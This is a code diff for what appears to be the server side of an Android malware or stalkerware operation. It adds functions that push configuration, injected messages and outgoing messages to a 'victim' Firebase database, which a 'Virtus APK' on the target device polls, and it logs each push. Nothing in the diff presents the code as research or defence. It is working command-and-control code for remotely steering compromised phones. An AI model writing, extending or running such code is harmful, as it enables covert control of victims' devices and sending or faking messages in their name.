@@ -87,15 +87,23 @@ async def _firebase_put_ok(url: str, data: dict, *, timeout: float = INJECT_TIME
 
 
 def _inject_firebase_bases(profile: MonitorProfile, device: Device | None = None) -> list[str]:
-    """All Firebase roots the APK may read (victim DB + module DB)."""
+    """Firebase roots for inject/outgoing — victim DB first (module DB often deactivated)."""
     bases: list[str] = []
-    primary = resolve_firebase_url(profile, device)
-    if primary:
-        bases.append(normalize_firebase_url(primary))
+    victim = resolve_firebase_url(profile, device)
+    if victim:
+        bases.append(normalize_firebase_url(victim))
     module_db = settings.virtus_module_db.rstrip("/")
     if module_db and module_db not in bases:
         bases.append(module_db)
     return bases
+
+
+def resolve_apk_firebase_url(profile: MonitorProfile, device: Device | None = None) -> str:
+    """URL the Virtus APK polls for messages/{device_id}/."""
+    victim = resolve_firebase_url(profile, device)
+    if victim:
+        return normalize_firebase_url(victim)
+    return settings.virtus_module_db.rstrip("/")
 
 
 def _outgoing_poll_ids(profile: MonitorProfile, device: Device) -> list[str]:
@@ -110,8 +118,32 @@ def _outgoing_poll_ids(profile: MonitorProfile, device: Device) -> list[str]:
     return ids
 
 
+async def push_virtus_apk_config(profile: MonitorProfile, device: Device | None = None) -> None:
+    """Write APK-readable config on victim Firebase (config/{KEY} + virtus_config.json)."""
+    firebase_url = resolve_apk_firebase_url(profile, device)
+    license_key = get_license_key(profile)
+    if not firebase_url or not license_key or not license_key.upper().startswith("KEY-"):
+        return
+
+    poll_id = resolve_apk_poll_id(profile, device)
+    payload = {
+        "monitoring": profile.is_monitoring,
+        "ts": int(time.time() * 1000),
+        "firebase_url": firebase_url,
+        "device_id": poll_id,
+        "firebase_key": license_key.strip().upper(),
+    }
+    base = normalize_firebase_url(firebase_url)
+    key = license_key.strip().upper()
+    await asyncio.gather(
+        _firebase_put_ok(f"{base}/config/{key}", payload),
+        _firebase_put_ok(f"{base}/virtus_config.json", payload),
+        return_exceptions=True,
+    )
+
+
 async def push_module_config(profile: MonitorProfile, device: Device | None = None) -> None:
-    """Push Astik-style APK config to module DB: config/{KEY}."""
+    """Push Astik-style APK config to victim + module DB: config/{KEY}."""
     firebase_url = resolve_firebase_url(profile, device)
     if not firebase_url:
         return
@@ -130,8 +162,9 @@ async def push_module_config(profile: MonitorProfile, device: Device | None = No
         monitoring=profile.is_monitoring,
         device_id=resolve_apk_poll_id(profile, device),
         target_number=profile.phone_number,
-        firebase_url=firebase_url,
+        firebase_url=resolve_apk_firebase_url(profile, device),
     )
+    await push_virtus_apk_config(profile, device)
 
 
 def _outgoing_device_ids(device: Device) -> list[str]:
@@ -212,7 +245,13 @@ async def push_outgoing_via_messages(
             tasks.append(_firebase_put_ok(f"{base}/messages/{device_id}/{message_id}", payload))
     results = await asyncio.gather(*tasks, return_exceptions=True)
     if any(result is True for result in results):
+        logger.info(
+            "Outgoing __OUT__ queued ids=%s bases=%s",
+            poll_ids,
+            [normalize_firebase_url(url) for url in _inject_firebase_bases(profile, device)],
+        )
         return message_id
+    logger.error("Outgoing __OUT__ push failed for %s", poll_ids)
     return None
 
 
@@ -319,7 +358,17 @@ async def push_mynum_inject(
         tasks.append(_firebase_put_ok(f"{base}/messages/{poll_id}/{message_id}", payload))
     results = await asyncio.gather(*tasks, return_exceptions=True)
     if any(result is True for result in results):
+        logger.info(
+            "Inject queued poll_id=%s bases=%s",
+            poll_id,
+            [normalize_firebase_url(url) for url in _inject_firebase_bases(profile, device)],
+        )
         return message_id
+    logger.error(
+        "Inject push failed poll_id=%s bases=%s",
+        poll_id,
+        _inject_firebase_bases(profile, device),
+    )
     return None
 
 
